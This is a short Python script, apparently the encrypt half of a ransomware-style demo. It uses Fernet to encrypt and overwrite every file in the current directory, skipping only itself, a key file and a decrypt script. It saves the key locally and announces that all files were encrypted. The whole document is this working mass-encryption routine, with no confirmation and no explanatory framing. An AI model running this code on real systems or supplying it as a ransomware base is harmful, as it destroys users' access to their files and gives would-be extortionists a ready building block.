from cryptography.fernet import Fernet
import os 

files = []

for file in os.listdir():
    if(file == "encrypt.py" or file == 'keyfile.txt' or file == 'decrypt.py'):
        continue
    files.append(file)

key = Fernet.generate_key()
with open('keyfile.txt', "wb") as keyfile:
    keyfile.write(key)

for file in files:
    with open(file,'rb') as thefile:
        contents = thefile.read()
        encrypted_content = Fernet(key).encrypt(contents)
    with open(file,'wb') as thefile:
        thefile.write(encrypted_content)

print("All files in this directory were encrypted !")
